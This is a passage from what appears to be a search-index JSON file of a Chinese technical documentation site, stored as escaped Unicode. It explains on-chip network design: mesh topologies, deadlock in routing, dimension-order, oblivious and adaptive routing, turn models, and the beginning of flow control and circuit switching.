\u200b\u7684\u200b\uff0c\u200b\u6240\u4ee5\u200b\u7247\u4e0a\u200b\u7f51\u7edc\u200b\u4e00\u822c\u200b\u4f1a\u200b\u7528\u200b\u53ef\u4ee5\u200b\u653e\u5728\u200b\u5e73\u9762\u200b\u4e0a\u200b\u7684\u200b\u62d3\u6251\u200b\uff0c\u200b\u6bd4\u8f83\u200b\u5e38\u89c1\u200b\u7684\u200b\u5c31\u662f\u200b Mesh \u200b\u548c\u200b Ring\u3002</p>"},{"location":"hardware/on_chip_networks.html#_4","title":"\u8def\u7531","text":"<p>\u200b\u786e\u5b9a\u200b\u597d\u200b\u7f51\u7edc\u62d3\u6251\u200b\u540e\u200b\uff0c\u200b\u5728\u200b\u5b9e\u9645\u200b\u4f20\u8f93\u200b\u4e4b\u524d\u200b\uff0c\u200b\u7531\u4e8e\u200b\u4e24\u4e2a\u200b\u7ed3\u70b9\u200b\u95f4\u200b\u8def\u5f84\u200b\u4e0d\u200b\u552f\u4e00\u200b\uff0c\u200b\u6240\u4ee5\u200b\u9700\u8981\u200b\u8003\u8651\u200b\u5982\u4f55\u200b\u628a\u200b\u8bf7\u6c42\u200b\u4ece\u200b\u8d77\u70b9\u200b\u8def\u7531\u200b\u5230\u200b\u7ec8\u70b9\u200b\u3002\u200b\u8fd9\u91cc\u200b\u4e3b\u8981\u200b\u8003\u8651\u200b\u7684\u200b\u662f\u200b Mesh \u200b\u62d3\u6251\u200b\u7684\u200b\u8def\u7531\u200b\u7b97\u6cd5\u200b\u3002</p> <p>\u200b\u9996\u5148\u200b\u5bb9\u6613\u200b\u60f3\u5230\u200b\u7684\u200b\u662f\u200b\u9009\u62e9\u200b\u6700\u77ed\u200b\u8def\u5f84\u200b\uff0c\u200b\u4f46\u200b\u5728\u200b Mesh \u200b\u62d3\u6251\u200b\u4e2d\u200b\uff0c\u200b\u6700\u77ed\u200b\u8def\u5f84\u200b\u4e5f\u200b\u662f\u200b\u4e0d\u200b\u552f\u4e00\u200b\u7684\u200b\uff0c\u200b\u56e0\u6b64\u200b\u8fd8\u662f\u200b\u9700\u8981\u200b\u66f4\u52a0\u200b\u5177\u4f53\u200b\u7684\u200b\u7b97\u6cd5\u200b\u6765\u200b\u505a\u51fa\u200b\u9009\u62e9\u200b\u3002</p> <p>\u200b\u8def\u7531\u200b\u5728\u200b\u9009\u53d6\u200b\u7684\u200b\u65f6\u5019\u200b\u8fd8\u200b\u9700\u8981\u200b\u8003\u8651\u200b\u6b7b\u9501\u200b\u7684\u200b\u95ee\u9898\u200b\uff1a\u200b\u7531\u4e8e\u200b\u901a\u5e38\u200b\u7247\u4e0a\u200b\u7f51\u7edc\u200b\u662f\u200b\u4e0d\u200b\u5141\u8bb8\u200b\u4e22\u5305\u200b\u7684\u200b\uff0c\u200b\u56e0\u6b64\u200b\u5982\u679c\u200b\u53d1\u9001\u6570\u636e\u200b\u65f6\u200b\uff0c\u200b\u63a5\u6536\u200b\u65b9\u200b\u7684\u200b\u7f13\u51b2\u533a\u200b\u5df2\u7ecf\u200b\u6ee1\u200b\u4e86\u200b\uff0c\u200b\u5c31\u200b\u4e0d\u80fd\u200b\u7ee7\u7eed\u200b\u53d1\u9001\u200b\u4e86\u200b\u3002\u200b\u90a3\u4e48\u200b\u8fd9\u4e2a\u200b\u65f6\u5019\u200b\u5c31\u200b\u4f1a\u200b\u51fa\u73b0\u200b\u4e00\u4e2a\u200b\u4f9d\u8d56\u200b\u5173\u7cfb\u200b\uff1aA \u200b\u8981\u200b\u53d1\u7ed9\u200b B\uff0c\u200b\u4f46\u200b\u540c\u65f6\u200b B \u200b\u4e5f\u200b\u8981\u200b\u53d1\u7ed9\u200b C\uff0c\u200b\u73b0\u5728\u200b B \u200b\u548c\u200b C \u200b\u7684\u200b\u7f13\u51b2\u533a\u200b\u6ee1\u200b\u4e86\u200b\uff0c\u200b\u90a3\u4e48\u200b\u53ea\u6709\u200b\u7b49\u200b C \u200b\u7684\u200b\u7f13\u51b2\u533a\u200b\u91ca\u653e\u200b\u7a7a\u95f4\u200b\uff0cB \u200b\u624d\u80fd\u200b\u53d1\u7ed9\u200b C\uff0c\u200b\u7136\u540e\u200b B \u200b\u7684\u200b\u7f13\u51b2\u533a\u200b\u624d\u200b\u5f97\u4ee5\u200b\u91ca\u653e\u200b\uff0cA \u200b\u624d\u80fd\u200b\u53d1\u7ed9\u200b B\u3002\u200b\u6362\u53e5\u8bdd\u8bf4\u200b\uff0cA \u200b\u5230\u200b B \u200b\u7684\u200b\u4f20\u8f93\u200b\u53ea\u6709\u200b\u7b49\u200b B \u200b\u5230\u200b C \u200b\u7684\u200b\u4f20\u8f93\u200b\u5b8c\u6210\u200b\u624d\u200b\u53ef\u4ee5\u200b\u7ee7\u7eed\u200b\u3002</p> <p>\u200b\u90a3\u4e48\u200b\uff0c\u200b\u5047\u5982\u200b\u6b64\u65f6\u200b A \u200b\u5230\u200b B \u200b\u8981\u200b\u7b49\u5f85\u200b B \u200b\u5230\u200b C \u200b\u4f20\u8f93\u200b\u5b8c\u6210\u200b\uff0cB \u200b\u5230\u200b C \u200b\u8981\u200b\u7b49\u5f85\u200b C \u200b\u5230\u200b D \u200b\u4f20\u8f93\u200b\u5b8c\u6210\u200b\uff0cC \u200b\u5230\u200b D \u200b\u8981\u200b\u7b49\u5f85\u200b D \u200b\u5230\u200b A \u200b\u4f20\u8f93\u200b\u5b8c\u6210\u200b\uff0cD \u200b\u5230\u200b A \u200b\u8981\u200b\u7b49\u5f85\u200b A \u200b\u5230\u200b B \u200b\u4f20\u8f93\u200b\u5b8c\u6210\u200b\uff0c\u200b\u6b64\u65f6\u200b\u5c31\u200b\u51fa\u73b0\u200b\u4e86\u200b\u6b7b\u9501\u200b\uff1a\u200b\u4e92\u76f8\u200b\u4f9d\u8d56\u200b\uff0c\u200b\u51fa\u73b0\u200b\u4e86\u200b\u73af\u200b\uff0c\u200b\u5e76\u4e14\u200b\u6ca1\u6709\u200b\u529e\u6cd5\u200b\u4ece\u200b\u73af\u4e2d\u200b\u9000\u51fa\u200b\uff0c\u200b\u90a3\u200b\u5c31\u200b\u6b7b\u9501\u200b\u4e86\u200b\u3002</p> <p> </p> \u200b\u8def\u7531\u200b\u534f\u8bae\u200b\u6b7b\u9501\u200b\u7684\u200b\u60c5\u51b5\u200b\uff08\u200b\u56fe\u6e90\u200b On Chip Networks, Second Edition\uff09 <p>\u200b\u4e00\u4e2a\u200b\u7ecf\u5178\u200b\u7684\u200b\u8def\u7531\u200b\u7b97\u6cd5\u200b\u662f\u200b\u7ef4\u5e8f\u200b\u8def\u7531\u200b\uff08Dimension Ordering Routing\uff0c\u200b\u7b80\u79f0\u200b DOR\uff09\uff0c\u200b\u610f\u601d\u200b\u5c31\u662f\u200b\u6309\u7167\u200b\u7ef4\u5ea6\u200b\u7684\u200b\u987a\u5e8f\u200b\u53bb\u8def\u200b\u7531\u200b\uff0c\u200b\u53ea\u6709\u200b\u524d\u200b\u4e00\u4e2a\u200b\u7ef4\u5ea6\u200b\u8d70\u5230\u200b\u548c\u200b\u7ec8\u70b9\u200b\u76f8\u540c\u200b\uff0c\u200b\u624d\u200b\u4f1a\u200b\u5728\u200b\u4e0b\u200b\u4e00\u4e2a\u200b\u7ef4\u5ea6\u200b\u7ee7\u7eed\u200b\u8d70\u200b\u3002\u200b\u4f8b\u5982\u200b\u5728\u200b\u4e8c\u7ef4\u200b\u573a\u666f\u200b\u4e0b\u200b\uff0cX-Y \u200b\u8def\u7531\u200b\u5c31\u662f\u200b\u5148\u8d70\u200b X \u200b\u8f74\u200b\uff0c\u200b\u8d70\u200b\u5b8c\u200b X \u200b\u8f74\u200b\u4ee5\u540e\u200b\u518d\u200b\u8d70\u200b Y \u200b\u8f74\u200b\u3002\u200b\u53cd\u8fc7\u6765\u200b Y-X \u200b\u8def\u7531\u200b\u5219\u200b\u662f\u200b\u5148\u200b\u8d70\u200b Y \u200b\u8f74\u200b\uff0c\u200b\u518d\u200b\u8d70\u200b X \u200b\u8f74\u200b\u3002</p> <p>\u200b\u7ef4\u5e8f\u200b\u8def\u7531\u200b\u5341\u5206\u200b\u7b80\u5355\u200b\uff0c\u200b\u5bb9\u6613\u200b\u5b9e\u73b0\u200b\uff0c\u200b\u5e76\u4e14\u200b\u4e0d\u4f1a\u200b\u51fa\u73b0\u200b\u6b7b\u9501\u200b\u3002\u200b\u7ef4\u5e8f\u200b\u8def\u7531\u200b\u4e0d\u4f1a\u200b\u51fa\u73b0\u200b\u6b7b\u9501\u200b\u7684\u200b\u539f\u56e0\u200b\u662f\u200b\uff0c\u200b\u5b83\u200b\u7684\u200b\u4f9d\u8d56\u200b\u4e0d\u4f1a\u200b\u51fa\u73b0\u200b\u73af\u200b\uff1a\u200b\u4ee5\u200b X-Y \u200b\u8def\u7531\u200b\u4e3a\u4f8b\u200b\uff0c\u200b\u6240\u6709\u200b X \u200b\u65b9\u5411\u200b\u4e0a\u200b\u7684\u200b\u4f20\u8f93\u200b\u53ef\u80fd\u200b\u4f9d\u8d56\u200b Y \u200b\u65b9\u5411\u200b\u4e0a\u200b\u7684\u200b\u4f20\u8f93\u200b\uff0c\u200b\u4f46\u200b Y \u200b\u65b9\u5411\u200b\u4e0a\u200b\u7684\u200b\u4f20\u8f93\u200b\u4e0d\u4f1a\u200b\u4f9d\u8d56\u200b X \u200b\u65b9\u5411\u200b\u4e0a\u200b\u7684\u200b\u4f20\u8f93\u200b\u3002\u200b\u8fd8\u662f\u200b\u4ee5\u4e0a\u200b\u56fe\u4e3a\u200b\u4f8b\u5b50\u200b\uff1aA \u200b\u5230\u200b B \u200b\u7684\u200b\u4f20\u8f93\u200b\u4f9d\u8d56\u200b B \u200b\u5230\u200b C \u200b\u7684\u200b\u4f20\u8f93\u200b\uff0c\u200b\u4f46\u662f\u200b B \u200b\u5230\u200b C \u200b\u7684\u200b\u4f20\u8f93\u200b\u4e0d\u4f1a\u200b\u4f9d\u8d56\u200b C \u200b\u5230\u200b D \u200b\u7684\u200b\u4f20\u8f93\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u8fd9\u200b\u4e0d\u200b\u7b26\u5408\u200b X-Y \u200b\u8def\u7531\u200b\u7684\u200b\u89c4\u5219\u200b\u3002</p> <p>\u200b\u4f46\u662f\u200b\u7ef4\u5e8f\u200b\u8def\u7531\u200b\u7684\u200b\u7f3a\u70b9\u200b\u4e5f\u200b\u5f88\u200b\u660e\u663e\u200b\uff1a\u200b\u6d6a\u8d39\u200b\u4e86\u200b\u5f88\u591a\u200b\u53ef\u80fd\u200b\u7684\u200b\u8def\u5f84\u200b\uff0c\u200b\u4f8b\u5982\u200b A \u200b\u548c\u200b B \u200b\u540c\u65f6\u200b\u8981\u200b\u5411\u200b C \u200b\u4f20\u8f93\u200b\uff0c\u200b\u5c31\u200b\u4f1a\u200b\u5728\u200b B \u200b\u5230\u200b C \u200b\u7684\u200b\u8fb9\u4e0a\u200b\u62e5\u6324\u200b\uff0c\u200b\u65e0\u6cd5\u200b\u5229\u7528\u200b\u5269\u4e0b\u200b\u7684\u200b\u8def\u5f84\u200b\u3002</p> <p>\u200b\u63a5\u4e0b\u6765\u200b\u4ecb\u7ecd\u200b\u8def\u7531\u200b\u7b97\u6cd5\u200b\u7684\u200b\u4e24\u4e2a\u200b\u5206\u7c7b\u200b\uff1a\u200b\u4e00\u7c7b\u200b\u662f\u200b Oblivious \u200b\u8def\u7531\u200b\u7b97\u6cd5\u200b\uff0c\u200b\u53e6\u4e00\u7c7b\u200b\u662f\u200b Adaptive \u200b\u8def\u7531\u200b\u7b97\u6cd5\u200b\u3002\u200b\u987e\u540d\u601d\u4e49\u200b\uff0cOblivious \u200b\u4e0d\u200b\u8003\u8651\u200b\u7f51\u7edc\u200b\u5f53\u524d\u200b\u7684\u200b\u62e5\u585e\u200b\u72b6\u6001\u200b\uff0c\u200b\u76f4\u63a5\u200b\u6309\u7167\u200b\u81ea\u5df1\u200b\u7684\u200b\u7b97\u6cd5\u200b\u6765\u53d1\u200b\uff1bAdaptive \u200b\u4f1a\u200b\u6839\u636e\u200b\u7f51\u7edc\u200b\u5f53\u524d\u200b\u7684\u200b\u62e5\u585e\u200b\u72b6\u6001\u200b\uff0c\u200b\u671f\u671b\u200b\u627e\u5230\u200b\u4e00\u4e2a\u200b\u4e0d\u200b\u90a3\u4e48\u200b\u62e5\u6324\u200b\u7684\u200b\u8def\u5f84\u200b\u3002</p> <p>\u200b\u663e\u7136\u200b\uff0c\u200b\u7ef4\u5e8f\u200b\u8def\u7531\u200b\u6ca1\u6709\u200b\u8003\u8651\u200b\u7f51\u7edc\u200b\u662f\u5426\u200b\u62e5\u585e\u200b\uff0c\u200b\u5c5e\u4e8e\u200b Oblivious \u200b\u8def\u7531\u200b\u7b97\u6cd5\u200b\u3002\u200b\u53e6\u200b\u4e00\u4e2a\u200b\u5178\u578b\u200b\u7684\u200b Oblivious \u200b\u8def\u7531\u200b\u662f\u200b Valiant \u200b\u968f\u673a\u200b\u8def\u7531\u200b\u7b97\u6cd5\u200b\uff1a\u200b\u968f\u673a\u200b\u9009\u62e9\u200b\u4e00\u4e2a\u200b\u4e2d\u95f4\u200b\u7ed3\u70b9\u200b\uff0c\u200b\u5148\u200b\u4ece\u200b\u8d77\u70b9\u200b\u8def\u7531\u200b\u5230\u200b\u4e2d\u95f4\u200b\u7ed3\u70b9\u200b\uff0c\u200b\u518d\u200b\u4ece\u200b\u4e2d\u95f4\u200b\u7ed3\u70b9\u200b\u8def\u7531\u200b\u5230\u200b\u7ec8\u70b9\u200b\u3002\u200b\u8fd8\u6709\u200b\u4e00\u79cd\u200b\u5178\u578b\u200b\u7684\u200b Oblivious \u200b\u8def\u7531\u200b\uff0c\u200b\u5c31\u662f\u200b\u968f\u673a\u200b\u9009\u62e9\u200b X-Y \u200b\u8def\u7531\u200b\u6216\u200b Y-X \u200b\u8def\u7531\u200b\u7684\u200b\u4e00\u79cd\u200b\uff0c\u200b\u4f46\u662f\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u51fa\u73b0\u200b\u6b7b\u9501\u200b\u3002</p> <p>Adaptive \u200b\u8def\u7531\u200b\u7b97\u6cd5\u200b\u7684\u200b\u76ee\u7684\u200b\u662f\u200b\uff0c\u200b\u6839\u636e\u200b\u7f51\u7edc\u200b\u7684\u200b\u62e5\u585e\u200b\u60c5\u51b5\u200b\uff0c\u200b\u627e\u5230\u200b\u4e00\u4e2a\u200b\u66f4\u4f18\u200b\u7684\u200b\u8def\u7531\u200b\uff0c\u200b\u7ed5\u8fc7\u200b\u62e5\u585e\u200b\u7684\u200b\u90e8\u5206\u200b\uff0c\u200b\u5b9e\u73b0\u200b\u66f4\u200b\u9ad8\u200b\u7684\u200b\u5e26\u5bbd\u200b\u5229\u7528\u7387\u200b\u3002\u200b\u4f8b\u5982\u200b\u5982\u679c\u200b\u6700\u77ed\u200b\u8def\u5f84\u200b\u4e0a\u200b\u51fa\u73b0\u200b\u4e86\u200b\u62e5\u585e\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5c1d\u8bd5\u200b\u7ed5\u8def\u200b\uff0c\u200b\u5728\u200b\u4e00\u6761\u200b\u4e0d\u200b\u62e5\u585e\u200b\u7684\u200b\u6700\u200b\u77ed\u200b\u8def\u5f84\u200b\u4e0a\u200b\u4f20\u8f93\u200b\u3002\u200b\u4f46\u662f\u200b\u7ed5\u8def\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u9700\u8981\u200b\u9632\u6b62\u200b\u6d3b\u9501\u200b\uff1a\u200b\u4e00\u76f4\u200b\u5728\u200b\u7ed5\u8def\u200b\uff0c\u200b\u4ece\u6765\u200b\u6ca1\u200b\u5230\u8fbe\u200b\u76ee\u7684\u5730\u200b\u3002</p> <p>\u200b\u8bbe\u8ba1\u200b Adaptive \u200b\u8def\u7531\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4e5f\u200b\u8981\u200b\u8003\u8651\u200b\u5982\u4f55\u200b\u907f\u514d\u200b\u6b7b\u9501\u200b\u3002\u200b\u7ef4\u5e8f\u200b\u8def\u7531\u200b\u4fdd\u8bc1\u200b\u4e86\u200b\u4e0d\u4f1a\u200b\u51fa\u73b0\u200b\u6b7b\u9501\u200b\uff0c\u200b\u4f46\u200b\u4e5f\u200b\u552f\u4e00\u200b\u786e\u5b9a\u200b\u4e86\u200b\u8def\u7531\u200b\uff0c\u200b\u65e0\u6cd5\u200b\u652f\u6301\u200b Adaptive \u200b\u8def\u7531\u200b\u3002\u200b\u4f46\u200b\u5b9e\u9645\u4e0a\u200b\uff0c\u200b\u4e3a\u4e86\u200b\u907f\u514d\u200b\u6b7b\u9501\u200b\uff0c\u200b\u4e0d\u200b\u9700\u8981\u200b\u50cf\u200b\u7ef4\u5e8f\u200b\u8def\u7531\u200b\u90a3\u4e48\u200b\u4e25\u683c\u200b\u3002</p> <p>\u200b\u56de\u987e\u200b\u4e00\u4e0b\u200b\u7ef4\u5e8f\u200b\u8def\u7531\u200b\u4e2d\u200b\u7684\u200b X-Y \u200b\u8def\u7531\u200b\uff1a\u200b\u5b83\u200b\u8981\u6c42\u200b\u5148\u8d70\u200b X \u200b\u8f74\u200b\uff0c\u200b\u518d\u200b\u8d70\u200b Y \u200b\u8f74\u200b\uff0c\u200b\u90a3\u4e48\u200b\u4ece\u200b X \u200b\u8f74\u200b\u62d0\u200b\u5230\u200b Y \u200b\u8f74\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u6709\u200b\u56db\u79cd\u200b\u60c5\u51b5\u200b\uff0c\u200b\u89c1\u200b\u4e0b\u56fe\u200b (b)\uff1a</p> <p> </p> Mesh \u200b\u7684\u200b\u8f6c\u5411\u200b\uff08(a) \u200b\u662f\u200b\u6240\u6709\u200b\u53ef\u80fd\u200b\uff0c(b) \u200b\u662f\u200b X-Y \u200b\u8def\u7531\u200b\uff09\uff08\u200b\u56fe\u6e90\u200b On Chip Networks, Second Edition\uff09 <p>\u200b\u8fd9\u79cd\u200b\u62d0\u6cd5\u200b\u53ef\u4ee5\u200b\u4fdd\u8bc1\u200b\u4e0d\u200b\u51fa\u73b0\u200b\u6b7b\u9501\u200b\uff0c\u200b\u4f46\u662f\u200b\u6709\u200b\u66f4\u52a0\u200b\u5bbd\u677e\u200b\u7684\u200b\u8f6c\u5411\u200b\u65b9\u5f0f\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u4fdd\u8bc1\u200b\u4e0d\u200b\u51fa\u73b0\u200b\u6b7b\u9501\u200b\uff0c\u200b\u4f8b\u5982\u200b\u4e0b\u9762\u200b\u7684\u200b\u4e09\u79cd\u200b\uff1a</p> <p> </p> Mesh \u200b\u7684\u200b\u4e09\u79cd\u200b\u8f6c\u5411\u200b\u6a21\u578b\u200b\uff08\u200b\u56fe\u6e90\u200b On Chip Networks, Second Edition\uff09 <p>\u200b\u6bcf\u79cd\u200b\u8f6c\u5411\u200b\u6a21\u578b\u200b\u90fd\u200b\u5728\u200b\u516b\u79cd\u200b\u8f6c\u5411\u200b\u4e2d\u200b\u53bb\u6389\u200b\u4e86\u200b\u4e24\u79cd\u200b\uff0c\u200b\u8fd9\u6837\u200b\u5c31\u200b\u5b9e\u73b0\u200b\u4e86\u200b\u65e0\u200b\u6b7b\u9501\u200b\u3002West First Turns \u200b\u7684\u200b\u610f\u601d\u200b\u662f\u200b\u5148\u5f80\u200b\u897f\u200b\u8d70\u200b\uff0c\u200b\u8f6c\u5411\u200b\u540e\u200b\u4e0d\u518d\u200b\u5f80\u897f\u200b\u8d70\u200b\uff1bNorth Last Turns \u200b\u7684\u200b\u610f\u601d\u200b\u662f\u200b\u5f80\u5317\u8d70\u200b\u53ea\u80fd\u200b\u51fa\u73b0\u200b\u5728\u200b\u6700\u540e\u200b\u9636\u6bb5\u200b\uff0c\u200b\u5f80\u5317\u8d70\u200b\u4ee5\u540e\u200b\u5c31\u200b\u4e0d\u518d\u200b\u8f6c\u5411\u200b\uff1bNegative First Turns \u200b\u7684\u200b\u610f\u601d\u200b\u662f\u200b\u5148\u5f80\u200b\u897f\u200b\uff08X \u200b\u8f74\u8d1f\u200b\u65b9\u5411\u200b\uff09\u200b\u6216\u8005\u200b\u5357\u200b\uff08Y \u200b\u8f74\u8d1f\u200b\u65b9\u5411\u200b\uff09\u200b\u8d70\u200b\uff0c\u200b\u4e4b\u540e\u200b\u518d\u200b\u5f80\u4e1c\u200b\uff08X \u200b\u8f74\u6b63\u200b\u65b9\u5411\u200b\uff09\u200b\u6216\u8005\u200b\u5317\u200b\uff08Y \u200b\u8f74\u6b63\u200b\u65b9\u5411\u200b\uff09\u200b\u8d70\u200b\u3002</p> <p>\u200b\u8fd8\u6709\u200b\u4e00\u79cd\u200b Odd-even \u200b\u65b9\u6cd5\u200b\uff1a\u200b\u5728\u200b\u5076\u6570\u200b\u5217\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u7981\u6b62\u200b\u4e1c\u8f6c\u200b\u5317\u548c\u5317\u200b\u8f6c\u897f\u200b\uff1b\u200b\u5728\u200b\u5947\u6570\u200b\u5217\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u7981\u6b62\u200b\u4e1c\u8f6c\u200b\u5357\u548c\u5357\u200b\u8f6c\u897f\u200b\u3002</p> <p>\u200b\u6709\u200b\u4e86\u200b\u66f4\u200b\u591a\u200b\u8f6c\u5411\u200b\u65b9\u5411\u200b\u540e\u200b\uff0c\u200b\u5c31\u200b\u5141\u8bb8\u200b\u51fa\u73b0\u200b\u591a\u79cd\u200b\u53ef\u80fd\u200b\u7684\u200b\u8def\u5f84\u200b\uff0c\u200b\u610f\u5473\u7740\u200b Adaptive \u200b\u8def\u7531\u200b\u7b97\u6cd5\u200b\u53ef\u4ee5\u200b\u5728\u200b\u4fdd\u8bc1\u200b\u4e0d\u200b\u6b7b\u9501\u200b\u7684\u200b\u524d\u63d0\u200b\u4e0b\u200b\uff0c\u200b\u627e\u51fa\u200b\u4e00\u6761\u200b\u6bd4\u8f83\u200b\u4f18\u7684\u200b\u8def\u5f84\u200b\u3002</p> <p>\u200b\u5728\u200b\u4e0b\u200b\u4e00\u8282\u200b\u4f1a\u200b\u4ecb\u7ecd\u200b\u5982\u4f55\u200b\u7528\u6d41\u200b\u63a7\u6765\u200b\u4fdd\u8bc1\u200b\u4e0d\u4f1a\u200b\u51fa\u73b0\u200b\u6b7b\u9501\u200b\uff0c\u200b\u6b64\u65f6\u200b\u8def\u7531\u200b\u5c31\u200b\u4e0d\u200b\u9700\u8981\u200b\u4fdd\u8bc1\u200b\u4e0d\u200b\u51fa\u73b0\u200b\u6b7b\u9501\u200b\u4e86\u200b\uff0c\u200b\u8fd9\u6837\u200b\u53ef\u4ee5\u200b\u83b7\u5f97\u200b\u66f4\u200b\u591a\u200b\u7684\u200b\u7075\u6d3b\u6027\u200b\u3002</p>"},{"location":"hardware/on_chip_networks.html#_5","title":"\u6d41\u63a7","text":"<p>\u200b\u786e\u5b9a\u200b\u597d\u200b\u8def\u7531\u200b\u4ee5\u540e\u200b\uff0c\u200b\u8fd8\u200b\u9700\u8981\u200b\u8003\u8651\u200b\u6d41\u91cf\u200b\u63a7\u5236\u200b\u7684\u200b\u95ee\u9898\u200b\uff1a\u200b\u5f53\u200b\u94fe\u8def\u200b\u51fa\u73b0\u200b\u62e5\u585e\u200b\uff0c\u200b\u5982\u4f55\u200b\u4fdd\u8bc1\u200b\u9ad8\u6548\u200b\u7684\u200b\u4f20\u8f93\u200b\u3002</p> <p>\u200b\u5728\u200b\u5b9e\u73b0\u200b\u6d41\u63a7\u200b\u4e4b\u524d\u200b\uff0c\u200b\u9700\u8981\u200b\u5148\u200b\u4e86\u89e3\u200b\u5728\u200b\u7247\u200b\u4e0a\u200b\u7f51\u7edc\u200b\u4e0a\u200b\u4f20\u8f93\u200b\u7684\u200b\u662f\u200b\u4ec0\u4e48\u200b\u6570\u636e\u200b\uff0c\u200b\u53c8\u200b\u662f\u200b\u600e\u4e48\u200b\u4f20\u8f93\u6570\u636e\u200b\u7684\u200b\u3002</p> <p>\u200b\u9996\u5148\u200b\uff0c\u200b\u7ed3\u70b9\u200b\u8981\u200b\u53d1\u9001\u200b\u7684\u200b\u662f\u200b\u6d88\u606f\u200b\uff08Message\uff09\uff0c\u200b\u4f8b\u5982\u200b\u8981\u200b\u8bfb\u5199\u200b\u5185\u5b58\u200b\uff0c\u200b\u5b9e\u73b0\u200b\u7f13\u5b58\u200b\u4e00\u81f4\u6027\u200b\u534f\u8bae\u200b\u7b49\u7b49\u200b\u3002\u200b\u5bf9\u4e8e\u200b\u4e0a\u5c42\u200b\u6765\u8bf4\u200b\uff0c\u200b\u5b83\u200b\u6536\u53d1\u200b\u7684\u200b\u90fd\u200b\u662f\u200b\u6d88\u606f\u200b\uff0c\u200b\u628a\u200b\u6d88\u606f\u200b\u4ea4\u7ed9\u200b\u7247\u4e0a\u200b\u7f51\u7edc\u200b\u4ee5\u540e\u200b\uff0c\u200b\u7531\u7247\u200b\u4e0a\u200b\u7f51\u7edc\u200b\u8d1f\u8d23\u200b\u4f20\u8f93\u200b\u5230\u200b\u76ee\u7684\u5730\u200b\uff0c\u200b\u800c\u200b\u4e0d\u200b\u9700\u8981\u200b\u8003\u8651\u200b\u7247\u4e0a\u200b\u7f51\u7edc\u200b\u662f\u200b\u5177\u4f53\u200b\u600e\u4e48\u200b\u5b9e\u73b0\u200b\u7684\u200b\u3002\u200b\u5982\u679c\u200b\u62ff\u200b\u7f51\u7edc\u200b\u6765\u200b\u7c7b\u6bd4\u200b\uff0c\u200b\u5c31\u200b\u50cf\u662f\u200b\u5728\u200b\u4e00\u4e2a\u200b\u53ef\u9760\u200b\u7684\u200b UDP \u200b\u534f\u8bae\u200b\u4e0a\u200b\u4f20\u8f93\u200b\u6d88\u606f\u200b\u3002</p> <p>\u200b\u6b63\u5982\u200b IP \u200b\u6709\u200b\u6700\u5927\u200b\u957f\u5ea6\u200b\uff0c\u200b\u9700\u8981\u200b\u8fdb\u884c\u200b\u5206\u7247\u200b\uff0c\u200b\u7247\u4e0a\u200b\u7f51\u7edc\u200b\u4e5f\u200b\u6709\u200b\u7c7b\u4f3c\u200b\u7684\u200b\u673a\u5236\u200b\uff0c\u200b\u5c31\u662f\u200b\u628a\u200b\u6d88\u606f\u200b\u62c6\u6210\u200b\u5f88\u591a\u200b\u4e2a\u200b Packet\uff0cPacket \u200b\u6709\u200b\u6700\u5927\u200b\u957f\u5ea6\u200b\u3002\u200b\u4ece\u200b Message \u200b\u5230\u200b Packet \u200b\u9664\u4e86\u200b\u5206\u7247\u200b\u4ee5\u5916\u200b\uff0c\u200b\u53ef\u80fd\u200b\u8fd8\u200b\u6d89\u53ca\u200b\u5230\u200b\u5730\u5740\u200b\u7684\u200b\u8f6c\u6362\u200b\uff1a\u200b\u4f8b\u5982\u200b\u6839\u636e\u200b\u8bfb\u53d6\u200b\u5185\u5b58\u200b\u7684\u200b\u5730\u5740\u200b\uff0c\u200b\u627e\u5230\u200b\u5730\u5740\u200b\u6240\u200b\u5bf9\u5e94\u200b\u7684\u200b\u5185\u5b58\u200b\u63a7\u5236\u5668\u200b\uff0c\u200b\u8ba1\u7b97\u200b\u51fa\u200b\u5185\u5b58\u200b\u63a7\u5236\u5668\u200b\u5728\u200b\u7247\u200b\u4e0a\u200b\u7f51\u7edc\u200b\u7684\u200b\u5750\u6807\u200b\uff0c\u200b\u7136\u540e\u200b\u586b\u200b\u5230\u200b Packet \u200b\u7684\u200b\u5934\u90e8\u200b\u4e0a\u200b\u3002\u200b\u5230\u200b Packet \u200b\u8fd9\u200b\u4e00\u5c42\u200b\u4e4b\u540e\u200b\uff0c\u200b\u5c31\u662f\u200b\u7528\u7247\u200b\u4e0a\u200b\u7f51\u7edc\u200b\u7684\u200b\u903b\u8f91\u200b\u6765\u200b\u5904\u7406\u200b\u4e86\u200b\uff0c\u200b\u4e0a\u5c42\u200b\u7684\u200b Message \u200b\u4ec5\u4ec5\u200b\u662f\u200b\u8f7d\u8377\u200b\u3002\u200b\u5f53\u200b Packet \u200b\u5230\u8fbe\u200b\u76ee\u7684\u5730\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5219\u200b\u8981\u200b\u91cd\u65b0\u200b\u7ec4\u88c5\u200b\u6210\u200b Message \u200b\u4ea4\u7ed9\u200b\u4e0a\u5c42\u200b\u903b\u8f91\u200b\u3002</p> <p>\u200b\u7b2c\u4e00\u4e2a\u200b\u6d41\u63a7\u200b\u65b9\u6cd5\u200b\u662f\u200b\u7535\u8def\u200b\u4ea4\u6362\u200b\uff08Circuit Switching\uff09\uff1a\u200b\u5148\u200b\u521d\u59cb\u5316\u200b\u4e00\u4e2a\u200b\u4ece\u200b\u8d77\u70b9\u200b\u5230\u200b\u7ec8\u70b9\u200b\u7684\u200b\u94fe\u8def\u200b\uff0c\u200b\u521d\u59cb\u5316\u200b\u597d\u200b\u4ee5\u540e\u200b\u624d\u200b\u5f00\u59cb\u200b\u53d1\u9001\u6570\u636e\u200b\uff0c\u200b\u6b64\u65f6\u200b\u6570\u636e\u200b\u4e0d\u200b\u9700\u8981\u200b\u5206\u7247\u200b\uff0c\u200b\u76f4\u63a5\u200b\u53d1\u9001\u200b\u3002\u200b\u94fe\u8def\u200b\u5efa\u7acb\u200b\u4ee5\u540e\u200b\uff0c\u200b\u94fe\u8def\u200b\u4e0a\u200b\u7684\u200b\u7ed3\u70b9\u200b\u53ea\u200b\u8d1f\u8d23\u200b\u4f20\u8f93\u200b\u8fd9\u200b\u4e00\u4e2a\u200b\u94fe\u8def\u200b\